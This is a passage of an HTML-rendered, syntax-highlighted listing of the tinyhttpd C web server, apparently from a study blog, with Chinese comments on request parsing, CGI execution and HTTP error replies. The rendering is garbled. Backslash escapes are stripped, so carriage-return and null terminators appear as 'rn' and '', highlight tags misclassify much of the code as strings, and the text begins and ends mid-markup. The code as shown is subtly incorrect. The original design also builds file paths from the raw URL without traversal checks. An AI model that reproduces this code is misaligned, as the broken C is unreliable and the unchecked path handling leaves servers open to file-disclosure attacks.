class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ISspace(x) isspace((int)(x))</span></span><br><span class="line"><span class="comment">//函数说明：检查参数c是否为空格字符，</span></span><br><span class="line"><span class="comment">//也就是判断是否为空格(&#x27; &#x27;)、定位字符(&#x27; t &#x27;)、CR(&#x27; r &#x27;)、换行(&#x27; n &#x27;)、垂直定位字符(&#x27; v &#x27;)或翻页(&#x27; f &#x27;)的情况。</span></span><br><span class="line"><span class="comment">//返回值：若参数c 为空白字符，则返回非 0，否则返回 0。</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERVER_STRING <span class="string">&quot;Server: jdbhttpd/0.1.0rn&quot;</span><span class="comment">//定义server名称</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">accept_request</span><span class="params">(<span class="type">int</span>)</span>;<span class="comment">//接收请求</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">bad_request</span><span class="params">(<span class="type">int</span>)</span>;<span class="comment">//无效请求</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cat</span><span class="params">(<span class="type">int</span>, FILE *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cannot_execute</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_die</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_cgi</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">get_line</span><span class="params">(<span class="type">int</span>, <span class="type">char</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">headers</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">not_found</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">serve_file</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">startup</span><span class="params">(u_short *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unimplemented</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* A request has caused a call to accept() on the server port to</span></span><br><span class="line"><span class="comment"> * return.  Process the request appropriately.</span></span><br><span class="line"><span class="comment"> * Parameters: the socket connected to the client */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">//接收客户端的连接，并读取请求数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">accept_request</span><span class="params">(<span class="type">int</span> client)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"> <span class="type">int</span> numchars;</span><br><span class="line"> <span class="type">char</span> method[<span class="number">255</span>];</span><br><span class="line"> <span class="type">char</span> url[<span class="number">255</span>];</span><br><span class="line"> <span class="type">char</span> path[<span class="number">512</span>];</span><br><span class="line"> <span class="type">size_t</span> i, j;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"> <span class="type">int</span> cgi = <span class="number">0</span>;      <span class="comment">/* becomes true if server decides this is a CGI</span></span><br><span class="line"><span class="comment">                    * program */</span></span><br><span class="line"> <span class="type">char</span> *query_string = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//获取一行HTTP报文数据</span></span><br><span class="line"> numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"> <span class="comment">//</span></span><br><span class="line"> i = <span class="number">0</span>; j = <span class="number">0</span>;</span><br><span class="line"> <span class="comment">//对于HTTP报文来说，第一行的内容即为报文的起始行，格式为&lt;method&gt; &lt;request-URL&gt; &lt;version&gt;，</span></span><br><span class="line"> <span class="comment">//每个字段用空白字符相连</span></span><br><span class="line"> <span class="keyword">while</span> (!ISspace(buf[j]) &amp;&amp; (i &lt; <span class="keyword">sizeof</span>(method) - <span class="number">1</span>))</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="comment">//提取其中的请求方式是GET还是POST</span></span><br><span class="line">  method[i] = buf[j];</span><br><span class="line">  i++; j++;</span><br><span class="line"> &#125;</span><br><span class="line"> method[i] = <span class="string">&#x27;&#x27;;</span></span><br><span class="line"><span class="string">//函数说明：strcasecmp()用来比较参数s1 和s2 字符串，比较时会自动忽略大小写的差异。</span></span><br><span class="line"><span class="string">//返回值：若参数s1 和s2 字符串相同则返回0。s1 长度大于s2 长度则返回大于0 的值，s1 长度若小于s2 长度则返回小于0 的值。</span></span><br><span class="line"><span class="string"> if (strcasecmp(method, &quot;GET&quot;) &amp;&amp; strcasecmp(method, &quot;POST&quot;))</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> //tinyhttp仅仅实现了GET和POST</span></span><br><span class="line"><span class="string">  unimplemented(client);</span></span><br><span class="line"><span class="string">  return;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">//cgi为标志位，置1说明开启cgi解析</span></span><br><span class="line"><span class="string"> if (strcasecmp(method, &quot;POST&quot;) == 0)</span></span><br><span class="line"><span class="string">//如果请求方法为POST，需要cgi解析</span></span><br><span class="line"><span class="string">  cgi = 1;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> i = 0;</span></span><br><span class="line"><span class="string"> //将method后面的后边的空白字符略过</span></span><br><span class="line"><span class="string"> while (ISspace(buf[j]) &amp;&amp; (j &lt; sizeof(buf)))</span></span><br><span class="line"><span class="string">  j++;</span></span><br><span class="line"><span class="string"> //继续读取request-URL</span></span><br><span class="line"><span class="string"> while (!ISspace(buf[j]) &amp;&amp; (i &lt; sizeof(url) - 1) &amp;&amp; (j &lt; sizeof(buf)))</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string">  url[i] = buf[j];</span></span><br><span class="line"><span class="string">  i++; j++;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> url[i] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">//如果是GET请求，url可能会带有?,有查询参数</span></span><br><span class="line"><span class="string"> if (strcasecmp(method, &quot;GET&quot;) == 0)</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string">  query_string = url;</span></span><br><span class="line"><span class="string">  while ((*query_string != &#x27;</span>?<span class="string">&#x27;) &amp;&amp; (*query_string != &#x27;</span><span class="string">&#x27;))</span></span><br><span class="line"><span class="string">   query_string++;</span></span><br><span class="line"><span class="string">  if (*query_string == &#x27;</span>?<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">  //如果带有查询参数，需要执行cgi，解析参数，设置标志位为1</span></span><br><span class="line"><span class="string">   cgi = 1;</span></span><br><span class="line"><span class="string">  //将解析参数截取下来</span></span><br><span class="line"><span class="string">   *query_string = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">   query_string++;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">//以上已经将起始行解析完毕</span></span><br><span class="line"><span class="string">//url中的路径格式化到path</span></span><br><span class="line"><span class="string"> sprintf(path, &quot;htdocs%s&quot;, url);</span></span><br><span class="line"><span class="string">//学习到这里明天继续TODO</span></span><br><span class="line"><span class="string">//如果path只是一个目录，默认设置为首页index.html</span></span><br><span class="line"><span class="string"> if (path[strlen(path) - 1] == &#x27;</span>/<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  strcat(path, &quot;index.html&quot;);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> //函数定义:    int stat(const char *file_name, struct stat *buf);</span></span><br><span class="line"><span class="string"> //函数说明:    通过文件名filename获取文件信息，并保存在buf所指的结构体stat中</span></span><br><span class="line"><span class="string"> //返回值:     执行成功则返回0，失败返回-1，错误代码存于errno（需要include &lt;errno.h&gt;）</span></span><br><span class="line"><span class="string"> if (stat(path, &amp;st) == -1) &#123;</span></span><br><span class="line"><span class="string"> //假如访问的网页不存在，则不断的读取剩下的请求头信息，并丢弃即可</span></span><br><span class="line"><span class="string">  while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;n&quot;, buf))  /* read &amp; discard headers */</span></span><br><span class="line"><span class="string">   numchars = get_line(client, buf, sizeof(buf));</span></span><br><span class="line"><span class="string">  //最后声明网页不存在</span></span><br><span class="line"><span class="string">  not_found(client);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> else</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> //如果访问的网页存在则进行处理</span></span><br><span class="line"><span class="string">  if ((st.st_mode &amp; S_IFMT) == S_IFDIR)//S_IFDIR代表目录</span></span><br><span class="line"><span class="string"> //如果路径是个目录，那就将主页进行显示</span></span><br><span class="line"><span class="string">   strcat(path, &quot;/index.html&quot;);</span></span><br><span class="line"><span class="string">  if ((st.st_mode &amp; S_IXUSR) ||</span></span><br><span class="line"><span class="string">      (st.st_mode &amp; S_IXGRP) ||</span></span><br><span class="line"><span class="string">      (st.st_mode &amp; S_IXOTH)    )</span></span><br><span class="line"><span class="string">      //S_IXUSR:文件所有者具可执行权限</span></span><br><span class="line"><span class="string">      //S_IXGRP:用户组具可执行权限</span></span><br><span class="line"><span class="string">      //S_IXOTH:其他用户具可读取权限</span></span><br><span class="line"><span class="string">   cgi = 1;</span></span><br><span class="line"><span class="string">  if (!cgi)</span></span><br><span class="line"><span class="string">  //将静态文件返回</span></span><br><span class="line"><span class="string">   serve_file(client, path);</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  //执行cgi动态解析</span></span><br><span class="line"><span class="string">   execute_cgi(client, path, method, query_string);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> close(client);//因为http是面向无连接的，所以要关闭</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Inform the client that a request it has made has a problem.</span></span><br><span class="line"><span class="string"> * Parameters: client socket */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">void bad_request(int client)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> char buf[1024];</span></span><br><span class="line"><span class="string">//发送400</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;HTTP/1.0 400 BAD REQUESTrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, sizeof(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;Content-type: text/htmlrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, sizeof(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, sizeof(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;&lt;P&gt;Your browser sent a bad request, &quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, sizeof(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;such as a POST without a Content-Length.rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, sizeof(buf), 0);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Put the entire contents of a file out on a socket.  This function</span></span><br><span class="line"><span class="string"> * is named after the UNIX &quot;cat&quot; command, because it might have been</span></span><br><span class="line"><span class="string"> * easier just to do something like pipe, fork, and exec(&quot;cat&quot;).</span></span><br><span class="line"><span class="string"> * Parameters: the client socket descriptor</span></span><br><span class="line"><span class="string"> *             FILE pointer for the file to cat */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">void cat(int client, FILE *resource)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">//发送文件的内容</span></span><br><span class="line"><span class="string"> char buf[1024];</span></span><br><span class="line"><span class="string">//读取文件到buf中</span></span><br><span class="line"><span class="string"> fgets(buf, sizeof(buf), resource);</span></span><br><span class="line"><span class="string"> while (!feof(resource))//判断文件是否读取到末尾</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> //读取并发送文件内容</span></span><br><span class="line"><span class="string">  send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string">  fgets(buf, sizeof(buf), resource);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Inform the client that a CGI script could not be executed.</span></span><br><span class="line"><span class="string"> * Parameter: the client socket descriptor. */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">void cannot_execute(int client)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> char buf[1024];</span></span><br><span class="line"><span class="string">//发送500</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;HTTP/1.0 500 Internal Server Errorrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;Content-type: text/htmlrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;&lt;P&gt;Error prohibited CGI execution.rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Print out an error message with perror() (for system errors; based</span></span><br><span class="line"><span class="string"> * on value of errno, which indicates system call errors) and exit the</span></span><br><span class="line"><span class="string"> * program indicating an error. */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">void error_die(const char *sc)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> perror(sc);</span></span><br><span class="line"><span class="string"> exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Execute a CGI script.  Will need to set environment variables as</span></span><br><span class="line"><span class="string"> * appropriate.</span></span><br><span class="line"><span class="string"> * Parameters: client socket descriptor</span></span><br><span class="line"><span class="string"> *             path to the CGI script */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">//执行cgi动态解析</span></span><br><span class="line"><span class="string">void execute_cgi(int client, const char *path,</span></span><br><span class="line"><span class="string">                 const char *method, const char *query_string)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> char buf[1024];</span></span><br><span class="line"><span class="string"> int cgi_output[2];//声明的读写管道，切莫被名称给忽悠，会给出图进行说明</span></span><br><span class="line"><span class="string"> int cgi_input[2];//</span></span><br><span class="line"><span class="string"> pid_t pid;</span></span><br><span class="line"><span class="string"> int status;</span></span><br><span class="line"><span class="string"> int i;</span></span><br><span class="line"><span class="string"> char c;</span></span><br><span class="line"><span class="string"> int numchars = 1;</span></span><br><span class="line"><span class="string"> int content_length = -1;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> buf[0] = &#x27;</span>A<span class="number">&#x27;</span>; buf[<span class="number">1</span>] = <span class="string">&#x27;&#x27;;</span></span><br><span class="line"><span class="string"> if (strcasecmp(method, &quot;GET&quot;) == 0)</span></span><br><span class="line"><span class="string"> //如果是GET请求</span></span><br><span class="line"><span class="string"> //读取并且丢弃头信息</span></span><br><span class="line"><span class="string">  while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;n&quot;, buf))</span></span><br><span class="line"><span class="string">   numchars = get_line(client, buf, sizeof(buf));</span></span><br><span class="line"><span class="string"> else  </span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> //处理的请求为POST</span></span><br><span class="line"><span class="string">  numchars = get_line(client, buf, sizeof(buf));</span></span><br><span class="line"><span class="string">  while ((numchars &gt; 0) &amp;&amp; strcmp(&quot;n&quot;, buf))</span></span><br><span class="line"><span class="string">  &#123;//循环读取头信息找到Content-Length字段的值</span></span><br><span class="line"><span class="string">   buf[15] = &#x27;</span><span class="string">&#x27;;//目的是为了截取Content-Length:</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">   if (strcasecmp(buf, &quot;Content-Length:&quot;) == 0)</span></span><br><span class="line"><span class="string">    //&quot;Content-Length: 15&quot;</span></span><br><span class="line"><span class="string">    content_length = atoi(&amp;(buf[16]));//获取Content-Length的值</span></span><br><span class="line"><span class="string">   numchars = get_line(client, buf, sizeof(buf));</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  if (content_length == -1) &#123;</span></span><br><span class="line"><span class="string">  //错误请求</span></span><br><span class="line"><span class="string">   bad_request(client);</span></span><br><span class="line"><span class="string">   return;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">//返回正确响应码200</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;HTTP/1.0 200 OKrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string">//#include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">//int pipe(int filedes[2]);</span></span><br><span class="line"><span class="string">//返回值：成功，返回0，否则返回-1。参数数组包含pipe使用的两个文件的描述符。fd[0]:读管道，fd[1]:写管道。</span></span><br><span class="line"><span class="string">//必须在fork()中调用pipe()，否则子进程不会继承文件描述符。</span></span><br><span class="line"><span class="string">//两个进程不共享祖先进程，就不能使用pipe。但是可以使用命名管道。</span></span><br><span class="line"><span class="string">//pipe(cgi_output)执行成功后，cgi_output[0]:读通道 cgi_output[1]:写通道，这就是为什么说不要被名称所迷惑</span></span><br><span class="line"><span class="string"> if (pipe(cgi_output) &lt; 0) &#123;</span></span><br><span class="line"><span class="string">  cannot_execute(client);</span></span><br><span class="line"><span class="string">  return;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> if (pipe(cgi_input) &lt; 0) &#123;</span></span><br><span class="line"><span class="string">  cannot_execute(client);</span></span><br><span class="line"><span class="string">  return;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> if ( (pid = fork()) &lt; 0 ) &#123;</span></span><br><span class="line"><span class="string">  cannot_execute(client);</span></span><br><span class="line"><span class="string">  return;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string"> //fork出一个子进程运行cgi脚本</span></span><br><span class="line"><span class="string"> if (pid == 0)  /* 子进程: 运行CGI 脚本 */</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string">  char meth_env[255];</span></span><br><span class="line"><span class="string">  char query_env[255];</span></span><br><span class="line"><span class="string">  char length_env[255];</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">  dup2(cgi_output[1], 1);//1代表着stdout，0代表着stdin，将系统标准输出重定向为cgi_output[1]</span></span><br><span class="line"><span class="string">  dup2(cgi_input[0], 0);//将系统标准输入重定向为cgi_input[0]，这一点非常关键，</span></span><br><span class="line"><span class="string">                        //cgi程序中用的是标准输入输出进行交互</span></span><br><span class="line"><span class="string">  close(cgi_output[0]);//关闭了cgi_output中的读通道</span></span><br><span class="line"><span class="string">  close(cgi_input[1]);//关闭了cgi_input中的写通道</span></span><br><span class="line"><span class="string">  //CGI标准需要将请求的方法存储环境变量中，然后和cgi脚本进行交互</span></span><br><span class="line"><span class="string">  //存储REQUEST_METHOD</span></span><br><span class="line"><span class="string">  sprintf(meth_env, &quot;REQUEST_METHOD=%s&quot;, method);</span></span><br><span class="line"><span class="string">  putenv(meth_env);</span></span><br><span class="line"><span class="string">  if (strcasecmp(method, &quot;GET&quot;) == 0) &#123;</span></span><br><span class="line"><span class="string">  //存储QUERY_STRING</span></span><br><span class="line"><span class="string">   sprintf(query_env, &quot;QUERY_STRING=%s&quot;, query_string);</span></span><br><span class="line"><span class="string">   putenv(query_env);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;   /* POST */</span></span><br><span class="line"><span class="string">    //存储CONTENT_LENGTH</span></span><br><span class="line"><span class="string">   sprintf(length_env, &quot;CONTENT_LENGTH=%d&quot;, content_length);</span></span><br><span class="line"><span class="string">   putenv(length_env);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"> // 表头文件#include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="string"> // 定义函数</span></span><br><span class="line"><span class="string"> // int execl(const char * path,const char * arg,....);</span></span><br><span class="line"><span class="string"> // 函数说明</span></span><br><span class="line"><span class="string"> // execl()用来执行参数path字符串所代表的文件路径，接下来的参数代表执行该文件时传递过去的argv(0)、argv[1]……，最后一个参数必须用空指针(NULL)作结束。</span></span><br><span class="line"><span class="string"> // 返回值</span></span><br><span class="line"><span class="string"> // 如果执行成功则函数不会返回，执行失败则直接返回-1，失败原因存于errno中。</span></span><br><span class="line"><span class="string">  execl(path, path, NULL);//执行CGI脚本</span></span><br><span class="line"><span class="string">  exit(0);</span></span><br><span class="line"><span class="string"> &#125; else &#123;    /* 父进程 */</span></span><br><span class="line"><span class="string">  close(cgi_output[1]);//关闭了cgi_output中的写通道，注意这是父进程中cgi_output变量和子进程要区分开</span></span><br><span class="line"><span class="string">  close(cgi_input[0]);//关闭了cgi_input中的读通道</span></span><br><span class="line"><span class="string">  if (strcasecmp(method, &quot;POST&quot;) == 0)</span></span><br><span class="line"><span class="string">   for (i = 0; i &lt; content_length; i++) &#123;</span></span><br><span class="line"><span class="string">    //开始读取POST中的内容</span></span><br><span class="line"><span class="string">    recv(client, &amp;c, 1, 0);</span></span><br><span class="line"><span class="string">    //将数据发送给cgi脚本</span></span><br><span class="line"><span class="string">    write(cgi_input[1], &amp;c, 1);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">   //读取cgi脚本返回数据</span></span><br><span class="line"><span class="string">  while (read(cgi_output[0], &amp;c, 1) &gt; 0)</span></span><br><span class="line"><span class="string">    //发送给浏览器</span></span><br><span class="line"><span class="string">   send(client, &amp;c, 1, 0);</span></span><br><span class="line"><span class="string">//运行结束关闭</span></span><br><span class="line"><span class="string">  close(cgi_output[0]);</span></span><br><span class="line"><span class="string">  close(cgi_input[1]);</span></span><br><span class="line"><span class="string">//定义函数：pid_t waitpid(pid_t pid, int * status, int options);</span></span><br><span class="line"><span class="string">//函数说明：waitpid()会暂时停止目前进程的执行, 直到有信号来到或子进程结束.</span></span><br><span class="line"><span class="string">//如果在调用wait()时子进程已经结束, 则wait()会立即返回子进程结束状态值. 子进程的结束状态值会由参数status 返回,</span></span><br><span class="line"><span class="string">//而子进程的进程识别码也会一快返回.</span></span><br><span class="line"><span class="string">//如果不在意结束状态值, 则参数status 可以设成NULL. 参数pid 为欲等待的子进程识别码, 其他数值意义如下：</span></span><br><span class="line"><span class="string">//1、pid&lt;-1 等待进程组识别码为pid 绝对值的任何子进程.</span></span><br><span class="line"><span class="string">//2、pid=-1 等待任何子进程, 相当于wait().</span></span><br><span class="line"><span class="string">//3、pid=0 等待进程组识别码与目前进程相同的任何子进程.</span></span><br><span class="line"><span class="string">//4、pid&gt;0 等待任何子进程识别码为pid 的子进程.</span></span><br><span class="line"><span class="string">  waitpid(pid, &amp;status, 0);</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Get a line from a socket, whether the line ends in a newline,</span></span><br><span class="line"><span class="string"> * carriage return, or a CRLF combination.  Terminates the string read</span></span><br><span class="line"><span class="string"> * with a null character.  If no newline indicator is found before the</span></span><br><span class="line"><span class="string"> * end of the buffer, the string is terminated with a null.  If any of</span></span><br><span class="line"><span class="string"> * the above three line terminators is read, the last character of the</span></span><br><span class="line"><span class="string"> * string will be a linefeed and the string will be terminated with a</span></span><br><span class="line"><span class="string"> * null character.</span></span><br><span class="line"><span class="string"> * Parameters: the socket descriptor</span></span><br><span class="line"><span class="string"> *             the buffer to save the data in</span></span><br><span class="line"><span class="string"> *             the size of the buffer</span></span><br><span class="line"><span class="string"> * Returns: the number of bytes stored (excluding null) */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">//解析一行http报文</span></span><br><span class="line"><span class="string">int get_line(int sock, char *buf, int size)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> int i = 0;</span></span><br><span class="line"><span class="string"> char c = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"> int n;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> while ((i &lt; size - 1) &amp;&amp; (c != &#x27;</span>n<span class="number">&#x27;</span>))</span><br><span class="line"> &#123;</span><br><span class="line">  n = recv(sock, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">/* DEBUG printf(&quot;%02Xn&quot;, c); */</span></span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">if</span> (c == <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    n = recv(sock, &amp;c, <span class="number">1</span>, MSG_PEEK);</span><br><span class="line">    <span class="comment">/* DEBUG printf(&quot;%02Xn&quot;, c); */</span></span><br><span class="line">    <span class="keyword">if</span> ((n &gt; <span class="number">0</span>) &amp;&amp; (c == <span class="string">&#x27;n&#x27;</span>))</span><br><span class="line">     recv(sock, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     c = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   buf[i] = c;</span><br><span class="line">   i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   c = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> buf[i] = <span class="string">&#x27;&#x27;;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> return(i);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Return the informational HTTP headers about a file. */</span></span><br><span class="line"><span class="string">/* Parameters: the socket to print the headers on</span></span><br><span class="line"><span class="string"> *             the name of the file */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">void headers(int client, const char *filename)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> char buf[1024];</span></span><br><span class="line"><span class="string"> (void)filename;  /* could use filename to determine file type */</span></span><br><span class="line"><span class="string">//发送HTTP头</span></span><br><span class="line"><span class="string"> strcpy(buf, &quot;HTTP/1.0 200 OKrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> strcpy(buf, SERVER_STRING);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;Content-Type: text/htmlrn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string"> strcpy(buf, &quot;rn&quot;);</span></span><br><span class="line"><span class="string"> send(client, buf, strlen(buf), 0);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">/* Give a client a 404 not found status message. */</span></span><br><span class="line"><span class="string">/**********************************************************************/</span></span><br><span class="line"><span class="string">void not_found(int client)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"> char buf[1024];</span></span><br><span class="line"><span class="string"> //返回404</span></span><br><span class="line"><span class="string"> sprintf(buf, &quot;HTTP/1.0 404 NOT FOUNDrn&quot;);</span></span><br><span 